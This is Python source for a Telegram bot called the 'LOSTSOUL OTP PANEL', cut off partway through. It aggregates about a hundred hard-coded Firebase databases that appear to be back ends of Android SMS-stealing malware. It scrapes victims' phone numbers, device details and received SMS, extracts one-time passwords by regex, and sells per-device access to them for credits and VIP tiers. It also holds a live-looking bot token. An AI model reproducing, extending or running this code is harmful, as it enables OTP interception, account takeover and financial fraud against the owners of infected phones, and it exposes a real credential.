#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
        LOSTSOUL OTP PANEL — PER-DEVICE CREDIT ACCESS
   Firebase Commander • Force-Join • Credits per Device • VIP
   DB Names Hidden from Users • Robust Persistence
╚══════════════════════════════════════════════════════════════╝
"""

import os
import re
import time
import json
import asyncio
import hashlib
import logging
from datetime import datetime
from typing import Optional
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, ChatMember
from telegram.error import BadRequest
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

logging.basicConfig(
    format="%(asctime)s — %(name)s — %(levelname)s — %(message)s",
    level=logging.WARNING,
)

# ══════════════════════════════════════════════════════════════
#  CONFIG — FIREBASE DATABASES
# ══════════════════════════════════════════════════════════════

DATABASES = {
    "Heaven": "https://hood-4ba1e-default-rtdb.firebaseio.com",
    "Lucifer": "https://lucifer-spreader-default-rtdb.firebaseio.com",
    "Totla": "https://totla-axis-default-rtdb.firebaseio.com",
    "RGG": "https://rgggggggggg-e2547-default-rtdb.firebaseio.com",
    "Bulbul": "https://bulbul8084-9a5df-default-rtdb.firebaseio.com",
    "Systumm": "https://systumm-c8526-default-rtdb.firebaseio.com",
    "Ravan": "https://ravan-98ef1-default-rtdb.firebaseio.com",
    "Yellow": "https://yellow-pannel-dadc7-default-rtdb.firebaseio.com",
    "PMKishan": "https://pmkishan8-6b70f-default-rtdb.firebaseio.com",
    "NoAdmin": "https://no-admin-e0a30-default-rtdb.firebaseio.com",
    "SexyPayload": "https://sexypayload-default-rtdb.firebaseio.com",
    "Love": "https://love-13ffc-default-rtdb.firebaseio.com",
    "Deepak": "https://deepak-c22e3-default-rtdb.firebaseio.com",
    "Takul": "https://takul-cf410-default-rtdb.firebaseio.com",
    "RTO": "https://rto-02-april06-default-rtdb.firebaseio.com",
    "PKSK": "https://projectpksk05102025-default-rtdb.firebaseio.com",
    "Rajkumar": "https://rajkumar-b6cbe-default-rtdb.firebaseio.com",
    "Rtoo": "https://rtoo-6c8e6-default-rtdb.firebaseio.com",
    "Upandar": "https://upandar-bb51e-default-rtdb.firebaseio.com",
    "Rolex": "https://rolex-carder-default-rtdb.firebaseio.com",
    "Rettiugh": "https://rettiugh-default-rtdb.firebaseio.com",
    "BusinessApps": "https://business-apps-ba1-8d27c-default-rtdb.firebaseio.com",
    "Jeet": "https://jeet-op-default-rtdb.firebaseio.com",
    "Vvvvv": "https://vvvvv-b5eae-default-rtdb.firebaseio.com",
    "Jaanu": "https://jaanubaby-f7b34-default-rtdb.firebaseio.com",
    "JJGambler": "https://jj-gambler-default-rtdb.firebaseio.com",
    "Suman": "https://suman-penal-default-rtdb.firebaseio.com",
    "Tuuui": "https://tuuui-60b15-default-rtdb.firebaseio.com",
    "AdminSonu": "https://admin-sonu-8a567-default-rtdb.firebaseio.com",
    "Rohet": "https://rohet10-8919f-default-rtdb.firebaseio.com",
    "Zeni": "https://zeni-ae60b-default-rtdb.firebaseio.com",
    "Maxxx": "https://maxxx-randi-default-rtdb.firebaseio.com",
    "Gulabi": "https://gulabi-fuddi-default-rtdb.firebaseio.com",
    "Comkingdir": "https://comkingdir-default-rtdb.firebaseio.com",
    "Tracegod": "https://tracegod-168d5-default-rtdb.firebaseio.com",
    "UCOp": "https://uc-op-ca3d2-default-rtdb.firebaseio.com",
    "SMSForward": "https://smsforward-b2198.firebaseio.com",
    "Hdrbf": "https://hdrbf-485ec-default-rtdb.firebaseio.com",
    "Bunty": "https://bunty-51bcc-default-rtdb.firebaseio.com",
    "VishalAravat": "https://vishal-x-aravat-default-rtdb.firebaseio.com",
    "AdminCliwny": "https://admin-cliwny-default-rtdb.firebaseio.com",
    "Danish": "https://danish-77fe3-default-rtdb.firebaseio.com",
    "MasterAdmin": "https://master-admin-6c650-default-rtdb.firebaseio.com",
    "PanelOp": "https://panel-op-feb4d-default-rtdb.firebaseio.com",
    "PM23": "https://pm23-98f32-default-rtdb.firebaseio.com",
    "Iiiii": "https://iiiii-ade0e-default-rtdb.firebaseio.com",
    "Pint": "https://pint-f465b-default-rtdb.firebaseio.com",
    "AdminPanel": "https://admin-panel-bfcdc-default-rtdb.firebaseio.com",
    "CallMeBitch": "https://callmebitchfumckyou-default-rtdb.firebaseio.com",
    "Demonrat": "https://demonrat-aa782-default-rtdb.firebaseio.com",
    "Access20": "https://access20-3fc38-default-rtdb.firebaseio.com",
    "Article": "https://article-efd36-default-rtdb.firebaseio.com",
    "Rajababu": "https://rajababukvirat-default-rtdb.firebaseio.com",
    "AxisSuraj": "https://axis-suraj-tele-apcd001-default-rtdb.firebaseio.com",
    "Sandycall": "https://sandycall-18b15-default-rtdb.firebaseio.com",
    "Suihd": "https://suihd-default-rtdb.firebaseio.com",
    "Harrwp": "https://harrwp-6be36-default-rtdb.firebaseio.com",
    "TestFirebase": "https://test-firebase.firebaseio.com",
    "Adutapp": "https://adutappbylucy-default-rtdb.firebaseio.com",
    "Download": "https://download-b7393-default-rtdb.firebaseio.com",
    "Bobnewloda": "https://bobnewloda-default-rtdb.firebaseio.com",
    "Artikumari": "https://artikumari-abc97-default-rtdb.firebaseio.com",
    "Seuihd": "https://seuihd-default-rtdb.firebaseio.com",
    "Gigapaid": "https://gigapaid-39e9c-default-rtdb.firebaseio.com",
    "Angeladmin": "https://angeladmin-9dedc-default-rtdb.firebaseio.com",
    "FirNew": "https://fir-new-fe8b8-default-rtdb.firebaseio.com",
    "Priysnshuu": "https://priysnshuu-default-rtdb.firebaseio.com",
    "Haab": "https://haab-b3370-default-rtdb.firebaseio.com",
    "Ueuwuw": "https://ueuwuw-default-rtdb.firebaseio.com",
    "Test": "https://test.firebaseio.com",
    "Jkhsadfhjk": "https://jkhsadfhjk-default-rtdb.firebaseio.com",
    "Sonic": "https://sonic-d5c1a-default-rtdb.firebaseio.com",
    "Jonisins": "https://jonisins-52271-default-rtdb.firebaseio.com",
    "Dusman": "https://dusman-abf8b-default-rtdb.firebaseio.com",
    "Riyy": "https://riyy-e012e-default-rtdb.firebaseio.com",
    "Xkpz": "https://xkpz-f937a-default-rtdb.firebaseio.com",
    "Thanu": "https://thanu-4174d-default-rtdb.firebaseio.com",
    "Vdgsh": "https://vdgsh-623ed-default-rtdb.firebaseio.com",
    "Vibe": "https://vibe-d238e-default-rtdb.firebaseio.com",
    "Jamini": "https://jamini-c946b-default-rtdb.firebaseio.com",
    "Chutkabaal": "https://chutkabaal-d7051-default-rtdb.firebaseio.com",
    "Surya": "https://surya-917b9-default-rtdb.firebaseio.com",
    "Doodh": "https://doodh-f4f98-default-rtdb.firebaseio.com",
    "Easrerrr": "https://easrerrr-default-rtdb.firebaseio.com",
    "Maxbhai": "https://maxbhai-b8d3a-default-rtdb.firebaseio.com",
    "Upandar2": "https://upandar-bb51e-default-rtdb.firebaseio.com",
    "Uuuuu": "https://uuuuu-ee02e-default-rtdb.firebaseio.com",
    "Vamprandi": "https://vamprandi-default-rtdb.firebaseio.com",
    "VishalMC": "https://vishal-mc-default-rtdb.firebaseio.com",
    "ProjectF2FD6": "https://project-f2fd6-default-rtdb.firebaseio.com",
    "Rajakk": "https://rajakk-80ecd-default-rtdb.firebaseio.com",
    "ILove": "https://i-love-9e34a-default-rtdb.firebaseio.com",
    "Customer1B7CA": "https://customer-1b7ca-default-rtdb.firebaseio.com",
    "Nunu2XX": "https://nunu2xx-a8c5b-default-rtdb.firebaseio.com",
}

FIREBASE_STATE: dict[str, dict] = {}

# ─── Global Config (admin editable) ───
CONFIG = {
    "credits": {
        "start_bonus":         10,
        "refer_bonus":         10,
        "daily_bonus":         5,
        "bot_create_base":     20,
        "bot_create_step":     10,
        "max_referrals":       100,
        "max_credits":         100000,
    },
    "access": {
        "number_cost":         5,
        "number_hours":        6,
    },
    "vip": {
        "coin_threshold":      500,
        "duration_hours":      24,
        "auto_deduct":         True,
    },
    "channels": [],
}

POLL_INTERVAL   = 5
SMS_LIMIT       = 15
TOKEN           = "8994974309:AAG5mMFmyzXKyV2zSutO3YgcRkS19gSnDkQ"
BOT_USERNAME    = "lostsoulotpbot"
DB_FILE         = "lostsoul_database.json"

ADMIN_IDS: set[int] = {794779881}

INACTIVE_THRESHOLD = 3
DB_PAGE_SIZE = 8

# ══════════════════════════════════════════════════════════════
#  GLOBAL STATE
# ══════════════════════════════════════════════════════════════

seen_ids:  set[str] = set()
first_run: bool     = True
_main_app: Optional[Application] = None
_http_session: Optional[aiohttp.ClientSession] = None

all_users: dict[int, dict] = {}
pending_action: dict[int, dict] = {}
user_cooldowns: dict[int, float] = {}
user_focus: dict[str, dict[int, str]] = {TOKEN: {}}
chats_registry: dict[str, set[int]] = {TOKEN: set()}

CLONES: dict[str, dict] = {}
GLOBAL_DEVICE_CACHE: dict[str, list] = {}

# ══════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════

def _default_state() -> dict:
    return {"status": "active", "last_check": 0.0, "fail_count": 0,
            "device_count": 0, "added_at": time.time()}

def ensure_state(name: str) -> dict:
    if name not in FIREBASE_STATE:
        FIREBASE_STATE[name] = _default_state()
    return FIREBASE_STATE[name]

def all_db_names() -> list[str]:
    return list(DATABASES.keys())

def status_icon(s: str) -> str:
    return {"active": "🟢", "hold": "🟡", "inactive": "🔴"}.get(s, "⚪")

def status_label(s: str) -> str:
    return {"active": "ACTIVE", "hold": "HOLD", "inactive": "INACTIVE"}.get(s, "?")

def fmt_ago(ts: float) -> str:
    if not ts: return "never"
    d = int(time.time() - ts)
    if d < 60:   return f"{d}s ago"
    if d < 3600: return f"{d // 60}m ago"
    if d < 86400: return f"{d // 3600}h ago"
    return f"{d // 86400}d ago"

def slugify(name: str) -> str:
    name = re.sub(r"[^A-Za-z0-9_]", "", name)
    return name[:24] or f"DB_{int(time.time()) % 100000}"

def mask_url(url: str) -> str:
    if not url or len(url) < 14: return "•" * 12
    return "•" * 20 + url[-10:]

def mask_db_tag(tag: str, is_admin: bool = False) -> str:
    """Non-admin users see generic hash instead of real DB name."""
    if is_admin: return tag
    if not tag: return "Device"
    h = int(hashlib.md5(tag.encode()).hexdigest()[:4], 16) % 9999
    return f"D{h:04d}"

def tlog(msg: str) -> None:
    t = datetime.now().strftime("%I:%M:%S %p")
    print(f"[{t}]  {msg}", flush=True)

# ══════════════════════════════════════════════════════════════
#  SAVE / LOAD — PERSISTENCE-FIRST
# ══════════════════════════════════════════════════════════════

def _sync_save_data():
    try:
        clones_to_save = {}
        for t, d in CLONES.items():
            clones_to_save[t] = {
                "creator": d.get("creator"),
                "expiry": d.get("expiry"),
                "custom_db": d.get("custom_db"),
                "users": d.get("users", {}),
                "username": d.get("username", ""),
            }
        data_to_dump = {
            "all_users": all_users,
            "CLONES": clones_to_save,
            "DATABASES": DATABASES,
            "FIREBASE_STATE": FIREBASE_STATE,
            "CONFIG": CONFIG,
        }
        tmp = DB_FILE + ".tmp"
        with open(tmp, "w") as f:
            json.dump(data_to_dump, f, indent=4)
        os.replace(tmp, DB_FILE)
    except Exception as e:
        tlog(f"Save Data Error: {e}")

async def save_data_async():
    await asyncio.to_thread(_sync_save_data)

def load_data():
    global all_users, CLONES, DATABASES, FIREBASE_STATE, CONFIG
    if not os.path.exists(DB_FILE):
        for name in DATABASES:
            ensure_state(name)
        tlog("No save file — using defaults")
        return

    try:
        with open(DB_FILE, "r") as f:
            data = json.load(f)

        loaded_users = {}
        for k, v in data.get("all_users", {}).items():
            try: loaded_users[int(k)] = v
            except: pass
        all_users.clear()
        all_users.update(loaded_users)

        CLONES.clear()
        for t, d in data.get("CLONES", {}).items():
            restored_users = {}
            for uk, uv in d.get("users", {}).items():
                try: restored_users[int(uk)] = uv
                except: pass
            d["users"] = restored_users
            CLONES[t] = d

        loaded_dbs = data.get("DATABASES", {})
        if loaded_dbs:
            DATABASES.clear()
            DATABASES.update(loaded_dbs)

        loaded_state = data.get("FIREBASE_STATE", {})
        if loaded_state:
            FIREBASE_STATE.clear()
            FIREBASE_STATE.update(loaded_state)

        loaded_conf = data.get("CONFIG", {})
        if loaded_conf:
            for k, v in loaded_conf.items():
                if isinstance(v, dict) and isinstance(CONFIG.get(k), dict):
                    CONFIG[k] = {**CONFIG.get(k, {}), **v}
                else:
                    CONFIG[k] = v

        for name in DATABASES:
            ensure_state(name)

        tlog(f"✅ Loaded: {len(all_users)} users, {len(DATABASES)} DBs, {len(CLONES)} clones")
    except Exception as e:
        tlog(f"Load Data Error: {e} — using defaults")

async def auto_save_loop():
    while True:
        await asyncio.sleep(30)
        await save_data_async()

# ══════════════════════════════════════════════════════════════
#  ANTI-SPAM & VIP & ACCESS
# ══════════════════════════════════════════════════════════════

def is_spamming(user_id: int) -> bool:
    if user_id in ADMIN_IDS: return False
    now = time.time()
    if now - user_cooldowns.get(user_id, 0) < 1.0: return True
    user_cooldowns[user_id] = now
    return False

def _get_users_db(bot_token: str) -> dict:
    return all_users if bot_token == TOKEN else CLONES.get(bot_token, {}).get("users", {})

def is_vip(bot_token: str, user_id: int) -> bool:
    if bot_token == TOKEN and user_id in ADMIN_IDS: return True
    if bot_token != TOKEN and user_id == CLONES.get(bot_token, {}).get("creator"): return True
    users_db = _get_users_db(bot_token)
    return time.time() < users_db.get(user_id, {}).get("vip_until", 0.0)

def get_vip_time_left(bot_token: str, user_id: int) -> str:
    if bot_token == TOKEN and user_id in ADMIN_IDS: return "♾️ Admin"
    users_db = _get_users_db(bot_token)
    left = users_db.get(user_id, {}).get("vip_until", 0.0) - time.time()
    if left <= 0: return "❌ Not VIP"
    return f"👑 {int(left // 3600)}h {int((left % 3600) // 60)}m"

def has_device_access(bot_token: str, user_id: int, device_id: str) -> bool:
    if is_vip(bot_token, user_id): return True
    users_db = _get_users_db(bot_token)
    acc = users_db.get(user_id, {}).get("number_access", {})
    return time.time() < acc.get(device_id, 0)

def device_access_left(bot_token: str, user_id: int, device_id: str) -> str:
    if is_vip(bot_token, user_id): return "👑 VIP — Unlimited"
    users_db = _get_users_db(bot_token)
    acc = users_db.get(user_id, {}).get("number_access", {})
    left = acc.get(device_id, 0) - time.time()
    if left <= 0: return "🔒 Locked"
    h = int(left // 3600)
    m = int((left % 3600) // 60)
    return f"⏱ {h}h {m}m left"

def grant_device_access(bot_token: str, user_id: int, device_id: str, hours: float):
    users_db = _get_users_db(bot_token)
    users_db.setdefault(user_id, {}).setdefault("number_access", {})
    cur = users_db[user_id]["number_access"].get(device_id, 0)
    users_db[user_id]["number_access"][device_id] = max(time.time(), cur) + hours * 3600

def remove_coins(users_db: dict, uid: int, amount: int, reason: str = "") -> bool:
    bal = users_db.get(uid, {}).get("coins", 0)
    if bal < amount: return False
    users_db[uid]["coins"] = bal - amount
    hist = users_db[uid].setdefault("coin_history", [])
    hist.insert(0, {"amount": -amount, "reason": reason,
                    "time": datetime.now().strftime("%d %b %H:%M")})
    if len(hist) > 15: users_db[uid]["coin_history"] = hist[:15]
    return True

def check_auto_vip(bot_token: str, uid: int) -> bool:
    if bot_token != TOKEN: return False
    if is_vip(bot_token, uid): return False
    threshold = CONFIG["vip"].get("coin_threshold", 0)
    if threshold <= 0: return False
    if all_users.get(uid, {}).get("coins", 0) < threshold: return False
    if CONFIG["vip"].get("auto_deduct", True):
        if not remove_coins(all_users, uid, threshold, "Auto-VIP purchase"):
            return False
    dur = CONFIG["vip"].get("duration_hours", 24)
    all_users.setdefault(uid, {})["vip_until"] = time.time() + dur * 3600
    return True

async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    tlog(f"Telegram API Error: {context.error}")

# ══════════════════════════════════════════════════════════════
#  HTTP
# ══════════════════════════════════════════════════════════════

async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=1000, keepalive_timeout=30)
        _http_session = aiohttp.ClientSession(connector=connector)
    return _http_session

async def fb_get(path: str, base: str) -> Optional[dict]:
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json" if path else f"{base}/.json"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
            if r.status != 200: return None
            data = await r.json(content_type=None)
            return data if isinstance(data, dict) else None
    except Exception:
        return None

async def fb_keys(path: str, base: str) -> list[str]:
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json?shallow=true" if path else f"{base}/.json?shallow=true"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
            if r.status != 200: return []
            data = await r.json(content_type=None)
            return list(data.keys()) if isinstance(data, dict) else []
    except Exception:
        return []

# ══════════════════════════════════════════════════════════════
#  FORCE-JOIN
# ══════════════════════════════════════════════════════════════

async def check_membership(bot_token, bot, user_id: int) -> list[str]:
    if bot_token != TOKEN: return []
    not_joined = []
    for ch in CONFIG.get("channels", []):
        try:
            member = await bot.get_chat_member(chat_id=f"@{ch['username']}", user_id=user_id)
            if member.status in (ChatMember.LEFT, ChatMember.BANNED, "kicked", "left"):
                not_joined.append(ch["username"])
        except Exception:
            not_joined.append(ch["username"])
    return not_joined

async def send_join_prompt(update: Update, is_main_bot: bool) -> None:
    channels = CONFIG.get("channels", [])
    if not channels:
        users_db = all_users
        users_db.setdefault(update.effective_chat.id, {})["verified"] = True
        return
    buttons = []
    for ch in channels:
        buttons.append([InlineKeyboardButton(f"📢 Join {ch['name']}", url=ch["url"])])
    buttons.append([InlineKeyboardButton("✅ I Have Joined — Check Now", callback_data="check_join")])
    text = "🔒 <b>Verification Required</b>\n\nBot use karne ke liye neeche diye gaye channels join karna hoga:\n\n"
    for ch in channels:
        text += f"• <b>{ch['name']}</b>\n"
    text += "\nJoin karne ke baad 'Check Now' button dabayein."
    await update.effective_message.reply_text(
        text, reply_markup=InlineKeyboardMarkup(buttons), disable_web_page_preview=True, parse_mode="HTML",
    )

# ══════════════════════════════════════════════════════════════
#  UTILITIES
# ══════════════════════════════════════════════════════════════

def fmt_num(n: str) -> str:
    c = re.sub(r"\D", "", n)
    if c.startswith("91") and len(c) == 12: return f"+{c}"
    if len(c) == 10: return f"+91{c}"
    if len(c) > 4: return f"+{c}"
    return c

def bat_emoji(pct: int) -> str:
    return "🔋" if pct >= 20 else "🪫"

OTP_PATTERNS = [
    re.compile(r"OTP[^\d]*(\d{4,8})", re.IGNORECASE),
    re.compile(r"code[^\d]*(\d{4,8})", re.IGNORECASE),
    re.compile(r"password[^\d]*(\d{4,8})", re.IGNORECASE),
    re.compile(r"\b(\d{6})\b"),
    re.compile(r"\b(\d{4})\b"),
]

def extract_otp(text: str) -> Optional[str]:
    for pat in OTP_PATTERNS:
        m = pat.search(text)
        if m: return m.group(1)
    return None

def parse_battery(val) -> int:
    if isinstance(val, (int, float)): return int(val)
    if isinstance(val, str):
        digits = re.sub(r"\D", "", val)
        return int(digits) if digits else 0
    return 0

# ══════════════════════════════════════════════════════════════
#  ONLINE DETECTION — ROBUST
# ══════════════════════════════════════════════════════════════

def parse_status_str(val) -> str:
    if val is None: return "offline"
    if val is True: return "online"
    if val is False: return "offline"
    if isinstance(val, (int, float)):
        return "online" if int(val) == 1 else "offline"
    s = str(val).lower().strip()
    if s in ("online", "active", "connected", "1", "true", "yes", "on"):
        return "online"
    return "offline"

def parse_status_bool(val) -> str:
    return parse_status_str(val)

def parse_status_multi(d: dict, extra_ts_fields: tuple = ()) -> str:
    if not isinstance(d, dict): return "offline"
    for key in ("status", "Status", "state", "State", "online", "isOnline", "is_online"):
        v = d.get(key)
        if v is None: continue
        if parse_status_str(v) == "online": return "online"
    ts_fields = ("lastSeen", "last_seen", "lastOnline", "last_online",
                 "timestamp", "time", "dateTime", "datetime",
                 "updatedAt", "updated_at", "lastUpdate", "last_update",
                 "currentTimeMillis", "heartbeat") + tuple(extra_ts_fields)
    for key in ts_fields:
        v = d.get(key)
        if not v: continue
        ts = 0
        try:
            if isinstance(v, (int, float)): ts = int(v)
            elif isinstance(v, str) and v.strip().isdigit(): ts = int(v.strip())
        except: ts = 0
        if not ts: continue
        if ts > 1e12: ts //= 1000
        if ts and (time.time() - ts) < 600:
            return "online"
    return "offline"

def sms_date(sms: dict) -> str:
    date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
    if date_str: return date_str
    if sms.get("timestamp"):
        try:
            ts = float(sms["timestamp"])
            if ts > 1e11: ts /= 1000
            return datetime.fromtimestamp(ts).strftime("%d %b %Y %I:%M %p")
        except: pass
    return "N/A"

def seen_key(device_id: str, k: str) -> str:
    return f"{device_id}/{k}"

def user_display(info: dict) -> str:
    name = info.get("name", "Unknown")
    uname = info.get("username", "")
    return f"{name} (@{uname})" if uname else name

# ══════════════════════════════════════════════════════════════
#  DEVICE CLASS
# ══════════════════════════════════════════════════════════════

PAGE_SIZE = 20

class Device:
    __slots__ = ("id","name","status","battery","timestamp","numbers","device_info","sms_path","base_url","db_tag")
    def __init__(self, id, name, status, battery, timestamp, numbers, device_info, sms_path, base_url, db_tag):
        self.id = id; self.name = name; self.status = status; self.battery = battery
        self.timestamp = timestamp; self.numbers = numbers; self.device_info = device_info
        self.sms_path = sms_path; self.base_url = base_url; self.db_tag = db_tag

# ══════════════════════════════════════════════════════════════
#  FIREBASE DATA FETCH
# ══════════════════════════════════════════════════════════════

async def fetch_db_data(tag: str, url: str) -> list[Device]:
    devices_list = []
    added_set = set()
    try:
        root_keys, sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
            fb_keys("", url),
            fb_get("All_Users/simDetails", url),
            fb_get("All_Users/Data/DeviceInfo", url),
            fb_get("user_data", url),
            fb_get("clients", url),
        )
        if sim_all and isinstance(sim_all, dict):
            info_all = device_info_all or {}
            for dev_id, sim in sim_all.items():
                if dev_id in added_set: continue
                added_set.add(dev_id)
                info = info_all.get(dev_id) or {}
                merged = {**(sim or {}), **info}
                nums = []
                for field in ("sim1Number", "sim2Number"):
                    n = (sim or {}).get(field, "") or ""
                    if n and len(re.sub(r"\D", "", n)) > 4: nums.append(fmt_num(n))
                model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
                devices_list.append(Device(
                    id=dev_id, name=model, status=parse_status_multi(merged),
                    battery=parse_battery(info.get("Battery")),
                    timestamp=int(info.get("currentTimeMillis") or 0), numbers=nums,
                    device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nAndroid: {info.get('AndroidVersion','')}\nID: {dev_id[:8]}",
                    sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))

        if user_data_all and isinstance(user_data_all, dict):
            for dev_id, data in user_data_all.items():
                if dev_id in added_set or not isinstance(data, dict): continue
                added_set.add(dev_id)
                nums = []
                for field in ("numberSim1","numberSim2","mobNo"):
                    n = data.get(field, "")
                    if n and len(re.sub(r"\D", "", str(n))) > 4: nums.append(fmt_num(str(n)))
                devices_list.append(Device(
                    id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}",
                    status=parse_status_multi(data),
                    battery=parse_battery(data.get("battery")),
                    timestamp=int(data.get("timestamp") or 0), numbers=nums,
                    device_info=data.get("Device_info") or f"ID: {dev_id[:8]}",
                    sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag))

        if clients_all and isinstance(clients_all, dict):
            for dev_id, client in clients_all.items():
                if dev_id in added_set or not isinstance(client, dict): continue
                nums = []
                mob = client.get("mobNo") or ""
                if mob and len(re.sub(r"\D","",mob)) > 5: nums.append(fmt_num(mob))
                elif client.get("sims") and isinstance(client["sims"], list):
                    if len(client["sims"]) > 0:
                        ph = (client["sims"] or {}).get("phoneNumber") or ""
                        if ph and len(re.sub(r"\D","",ph)) > 5: nums.append(fmt_num(ph))
                if not nums and not client.get("modelName"): continue
                added_set.add(dev_id)
                model = client.get("modelName") or f"Device-{dev_id[:6]}"
                devices_list.append(Device(
                    id=dev_id, name=model, status=parse_status_multi(client),
                    battery=parse_battery(client.get("battery")),
                    timestamp=0, numbers=nums,
                    device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}\nAndroid: {client.get('androidV','')}\nID: {dev_id[:8]}",
                    sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))

        if root_keys:
            type4_keys = [k for k in root_keys if len(k) == 16 and re.match(r"^[0-9a-fA-F]+$", k)]
            if type4_keys:
                async def fetch_t4(k):
                    info, sim, hb = await asyncio.gather(
                        fb_get(f"{k}/deviceInfo", url),
                        fb_get(f"{k}/simInfo", url),
                        fb_get(f"{k}/heartbeat", url))
                    return k, info, sim, hb
                results = await asyncio.gather(*(fetch_t4(k) for k in type4_keys))
                for k, info, sim, hb in results:
                    if not isinstance(info, dict) or k in added_set: continue
                    added_set.add(k)
                    nums = []
                    if isinstance(sim, dict):
                        for _, sim_v in sim.items():
                            if isinstance(sim_v, dict):
                                n = sim_v.get("number", "")
                                if n and len(re.sub(r"\D","",n)) > 4: nums.append(fmt_num(n))
                    ts = 0
                    if isinstance(hb, (int, float)): ts = int(hb)
                    elif isinstance(hb, str) and hb.strip().isdigit(): ts = int(hb.strip())
                    if ts > 1e12: ts //= 1000
                    is_online = bool(ts and (time.time() - ts) < 600)
                    merged = {"heartbeat": hb, **(info or {})}
                    if not is_online:
                        is_online = (parse_status_multi(merged) == "online")
                    model = info.get("model") or info.get("brand") or f"Device-{k[:6]}"
                    devices_list.append(Device(
                        id=k, name=model, status="online" if is_online else "offline",
                        battery=0, timestamp=ts, numbers=nums,
                        device_info=f"Model: {model}\nBrand: {info.get('brand','')}\nAndroid: {info.get('version','')}\nID: {k[:8]}",
                        sms_path=f"{k}/receivedSms", base_url=url, db_tag=tag))
    except Exception:
        pass
    return devices_list

async def get_all_devices(bot_token: str) -> list[Device]:
    dbs_to_check = [n for n in DATABASES if FIREBASE_STATE.get(n, {}).get("status") != "hold"]
    if bot_token != TOKEN and bot_token in CLONES:
        custom_db = CLONES[bot_token].get("custom_db")
        if custom_db: dbs_to_check.append(f"C_{bot_token[:6]}")
    devices = []
    for tag in dbs_to_check:
        devices.extend(GLOBAL_DEVICE_CACHE.get(tag, []))
    unique = {}
    for d in devices:
        if d.id not in unique: unique[d.id] = d
    dev_list = list(unique.values())
    dev_list.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
    return dev_list

async def get_device_sms(device: Device, limit: int = SMS_LIMIT) -> list[dict]:
    data = await fb_get(device.sms_path, device.base_url)
    if not data: return []
    entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
    entries.sort(key=lambda s: int(s.get("timestamp") or 0), reverse=True)
    return entries[:limit]

# ══════════════════════════════════════════════════════════════
#  CLONE SPAWNER
# ══════════════════════════════════════════════════════════════

async def start_clone_bot(clone_token: str):
    app = (Application.builder().token(clone_token)
        .connection_pool_size(1000).pool_timeout(60.0)
        .connect_timeout(30.0).read_timeout(30.0).write_timeout(30.0).build())
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(global_error_handler)
    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)
    return app

# ══════════════════════════════════════════════════════════════
#  UI BUILDERS
# ══════════════════════════════════════════════════════════════

def get_reply_menu(is_admin: bool, bot_token: str, chat_id: int = 0) -> ReplyKeyboardMarkup:
    keys = [
        [KeyboardButton("📱 Devices List"), KeyboardButton("🔍 Search Number")],
        [KeyboardButton("🔑 Recent OTPs"),  KeyboardButton("🏆 Leaderboard")],
        [KeyboardButton("👤 My Profile"),   KeyboardButton("💰 My Access")],
        [KeyboardButton("👑 Buy VIP"),      KeyboardButton("💸 Refer & Earn")],
        [KeyboardButton("💬 Support")],
    ]
    if is_admin:
        keys.append([KeyboardButton("🛡 Admin Panel"), KeyboardButton("📊 Bot Status")])
    return ReplyKeyboardMarkup(keys, resize_keyboard=True)

def device_label(d: Device) -> str:
    if d.numbers: return " & ".join(d.numbers)
    return f"{d.name} ({d.id[:8]})"

def device_list_header(devices: list[Device], page: int = 0) -> str:
    online  = sum(1 for d in devices if d.status == "online")
    offline = len(devices) - online
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    cost = CONFIG["access"]["number_cost"]
    hrs = CONFIG["access"]["number_hours"]
    return (
        f"✨ <b>LOSTSOUL OTP PANEL</b> ✨\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🟢 Online: <b>{online}</b>   🔴 Offline: <b>{offline}</b>\n"
        f"📱 Total: <b>{len(devices)}</b> Devices\n"
        f"💰 Unlock: <b>{cost} credits</b> / {hrs}h\n"
        f"📄 Page {page + 1}/{total_pages}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"Select a number below to connect:"
    )

def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboardMarkup:
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(0, min(page, total_pages - 1))
    start = page * PAGE_SIZE
    page_devs = devices[start:start + PAGE_SIZE]
    rows = []
    for d in page_devs:
        tag = f"[{mask_db_tag(d.db_tag)}] "
        icon = "🟢" if d.status == "online" else "🔴"
        lbl = f"{icon} 📱 {tag}{' & '.join(d.numbers)}" if d.numbers else f"{icon} ⚙️ {tag}{d.name} ({d.id[:6]})"
        rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"pg:{page - 1}"))
    nav.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
